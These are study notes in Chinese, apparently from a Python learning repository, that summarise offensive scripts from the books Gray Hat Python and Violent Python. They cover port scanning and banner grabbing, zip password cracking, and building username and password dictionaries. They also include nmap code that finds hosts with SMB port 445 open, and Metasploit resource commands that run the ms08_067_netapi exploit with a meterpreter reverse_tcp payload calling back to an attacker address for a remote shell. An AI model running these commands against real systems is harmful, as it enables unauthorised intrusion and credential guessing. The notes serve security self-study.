# learn-python
###20160510 python 灰帽编程 3   
  ip、port扫描器；生成ip段。
###20160510 python 灰帽编程 4   
  解析域名，生成用户名-口令 字典，包括根据域名生成的用户名口令。
###20160705 python绝技 
retBanner.py
  socket扫描ip，port，通过返回的banner查询vulnerable.txt
zippass.py
  zFile = zipfile.ZipFile('evil.zip', 'r')
  zFile.extractall(pwd='password')
  使用多线程：
  t = Thread(target = functionname, args = (args))
  t.start
4scanner.py
  argparse解析命令行参数
  # 参数用-h会与默认的帮助的-h冲突
    # 命令行下运行时需要使用python name.py
    # --portlist --后的是变量名
    # nargs = '*' 可是多个变量（端口）

  ```def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts```
2-5-conficker.py
  使用python nmap发现主机（扫描）
  ```def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts```
  使用python为metasploit配置.rc文件，操作metasploit：
  ```configFile.write('use exploit/windows/smb/psexec\n')
  ...
  configFile = open('meta.rc', 'w')```
2-6-freeFloat.py
  写PoC
  use exploit/windows/smb/ms08_067_netapi
  set RHOST 192.168.1.37
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 192.168.77.77
  set LPORT 7777
  exploit –j –z
  为了利用Metasploit的攻击，我们选择我们的Exploit(exploit/windows/smb/ms08_067_netapi)，然后设置目标为192.168.1.37。接下来我们指定攻击荷载为windows/meterpreter/reverse_tcp选择反向连接到我们的192.168.77.77的7777端口上，最后我们告诉Metasploit开始攻击系统。保存配置文件为conficker.rc，我们可以通过命令msfconsole -r conficker.rc来启动我们的攻击。这个命令会告诉Metasploit根据conficker.rc来启动攻击。如果成功，我们的攻击会返回一个命令行Shell来控制对方电脑。 

32recycle.py
用Python 将用户的SID 关联起来:通过检查 Windows 注册表键值HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>\ProfileImagePath，我们可以看到它返回 一个是%SystemDrive%\Documents and Settings\<USERID>。在下图中，我 们看到这允许我们将SID 为S-1-5-21-1275210071-1715567821-725345543- 1005 转化为用户名“alex”。
'''key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\" + sid)
            (value, type) = _winreg.QueryValueEx(key, "ProfileImagePath")
            user = value.split('\\')[-1]
'''
